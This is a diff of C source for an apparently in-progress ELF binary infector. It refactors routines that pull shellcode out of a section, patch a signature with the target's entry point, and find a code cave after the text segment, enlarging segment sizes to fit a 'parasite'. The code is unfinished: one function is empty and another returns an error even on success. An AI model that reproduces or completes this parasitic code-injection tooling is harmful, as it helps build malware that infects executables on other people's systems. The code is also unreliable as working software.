@@ -9,13 +9,14 @@
 #include <sys/stat.h>
 #include <sys/mman.h>
 
-/*
-static int elf_patch_ret_address(struct shellcode *s, Elf64_Addr\
-        addr)
+
+
+static int shellcode_patch_ret_address(struct Shellcode *this,  \
+        Elf64_Addr addr)
 {
-    for(int i = 0; i < s->m_size; i++){
-        if(*((uint8_t *)s->m_shellcode + i) == 0x55 &&          \
-                *((uint8_t *)s->m_shellcode + (i+1)) == 0x99){
+    for(int i = 0; i < this->m_size; i++){
+        if(*((uint8_t *)this->m_shellcode + i) == 0x55 &&       \
+                *((uint8_t *)this->m_shellcode + (i+1)) == 0x99){
             printf("signature found\n");
             printf("replacing address with entry point %lx\n",  \
                     addr);
@@ -23,39 +24,76 @@ static int elf_patch_ret_address(struct shellcode *s, Elf64_Addr\
             sprintf(buffer, "%lx", addr);
 
             for(int j = 0; j < 16; j++, i++){
-                *((uint8_t *)s->m_shellcode + i) = buffer[j];
+                *((uint8_t *)this->m_shellcode + i) = buffer[j];
             }
             return 0;
         }
     }
     printf("signature not found in shellcode\n");
     return -1;
-} */
+}
 
-static struct shellcode *elf_extract_section(Elf *elf, int index)
+static int shellcode_extract_section(Shellcode *this, int index)
 {
-    /* its not me, the one whos gonna free this */
-    struct shellcode *s = malloc(sizeof(struct shellcode));
-    if(s == NULL){
-        goto err;
-    }
-
-    s->m_size = (elf->m_shdr[index].sh_size + 8);
-    //s->PatchRetAddress = elf_patch_ret_address;
-    s->m_shellcode = malloc(sizeof(uint8_t) * s->m_size);
-    if(s->m_shellcode == NULL){
+    this->m_size = (this->m_elf->m_shdr[index].sh_size + 8);
+    this->m_shellcode = malloc(sizeof(uint8_t) * this->m_size);
+    if(this->m_shellcode == NULL){
         goto err1;
     }
 
-    memset(s->m_shellcode, 0, s->m_size);
-    memcpy(s->m_shellcode, &elf->m_map[elf->m_shdr[index].      \
-            sh_offset], elf->m_shdr[index].sh_size);
-err:
-    return s;
+    memset(this->m_shellcode, 0, this->m_size);
+    memcpy(this->m_shellcode, &this->m_elf->m_map[this->        \
+            m_elf->m_shdr[index].sh_offset], this->m_elf->m_shdr\
+            [index].sh_size);
 
 err1:
-    free(s);
-    return NULL;
+    return -1;
+}
+
+static int target_adjust_sections(Target *this)
+{
+
+}
+
+/*
+ * find free space in target binary
+ */
+static int target_find_free_space(Target *this, int parasite_size)
+{
+    bool text_found = false;
+    for(int i = 0;i < this->m_elf->m_ehdr->e_phnum; i++){
+        if(this->m_elf->m_phdr[i].p_type == PT_LOAD && this->   \
+                m_elf->m_phdr[i].p_flags == (PF_R | PF_X)){
+            printf("text segment found\n");
+            this->text_filesize = this->m_elf->m_phdr[i].p_filesz;
+            Elf64_Off text_start = this->m_elf->m_phdr[i].p_offset;
+            this->text_end = text_start + this->text_filesize;
+            this->parasite_addr = this->m_elf->m_phdr[i].       \
+                p_vaddr + this->text_filesize;
+
+            /* do this after injecting shellcode : resizing p_filesz and p_memsz */
+            this->m_elf->m_phdr[i].p_filesz += parasite_size;
+            this->m_elf->m_phdr[i].p_memsz += parasite_size;
+            text_found = true;
+
+        } else if (this->m_elf->m_phdr[i].p_type == PT_LOAD &&  \
+            (this->m_elf->m_phdr[i].p_offset - this->text_end)  \
+            < parasite_size && text_found){
+            this->available_freespace = this->m_elf->m_phdr[i]. \
+                p_offset - this->text_end;
+            printf("segment found with a gap of %d\n", this->   \
+                    available_freespace);
+        } else {
+            fprintf(stderr, "failed to find free space to       \
+                    inject shellcode\n");
+            goto err;
+        }
+    }
+
+    return 0;
+
+err:
+    return -1;
 }
 
 /*
@@ -78,43 +116,6 @@ static int elf_get_section_index_by_name(Elf *elf, const char   \
         }
     }
 
-    return -1;
-}
-
-/*
- * find free space in target binary
- */
-static int elf_find_free_space(Elf *elf, struct text_padding_info *padding_info)
-{
-    memset(padding_info, 0, sizeof(struct text_padding_info));
-
-    for(int i = 0; i < elf->m_ehdr->e_phnum; i++){
-        if(elf->m_phdr[i].p_type == PT_LOAD && elf->m_phdr      \
-                [i].p_flags == (PF_R | PF_X)){
-            printf("text segment found\n");
-            padding_info->text_filesize = elf->m_phdr[i]        \
-                .p_filesz;
-            padding_info->text_memsize = elf->m_phdr[i].p_memsz;
-            padding_info->text_start = elf->m_phdr[i].p_offset;
-            padding_info->text_end = padding_info->text_start + \
-                elf->m_phdr[i].p_filesz;
-
-        } else if (elf->m_phdr[i].p_type == PT_LOAD &&          \
-                (elf->m_phdr[i].p_offset - padding_info->text_end)
-                < padding_info->freespace) {
-            printf("segment found with a gap of %d\n",          \
-                    padding_info->freespace);
-            padding_info->freespace = elf->m_phdr[i].p_offset - \
-                padding_info->text_end;
-            printf("final gap size %d\n", padding_info->freespace);
-        } else {
-            fprintf(stderr, "failed to find a code cave\n");
-            goto err;
-        }
-    }
-    return 0;
-
-err:
     return -1;
 }
 
@@ -166,8 +167,8 @@ static int elf_init_file(Elf *this)
     }
 
     this->m_size = st.st_size;
-    this->m_map = mmap(NULL, this->m_size, PROT_READ |      \
-            PROT_WRITE, MAP_PRIVATE, fd, 0);
+    this->m_map =mmap(NULL, this->m_size, PROT_READ |PROT_WRITE \
+        , MAP_PRIVATE, fd, 0);
     if(this->m_map == MAP_FAILED){
         fprintf(stderr, "memory map failed");
         goto err1;
@@ -183,7 +184,7 @@ err:
     return -1;
 }
 
-Elf *ElfConstructor(char *filename)
+Elf *ElfConstructor(const char *filename)
 {
     Elf *elf = malloc(sizeof(Elf));
     if(elf == NULL){
@@ -245,7 +246,7 @@ Target *TargetConstructor(const char *filename)
 
     return target;
 
-err:
+err2:
     ElfDestructor(target->m_elf);
 
 err1:
@@ -286,7 +287,7 @@ Shellcode *ShellcodeConstructor(const char *filename)
 
     return shellcode;
 
-err:
+err2:
     ElfDestructor(shellcode->m_elf);
 
 err1:
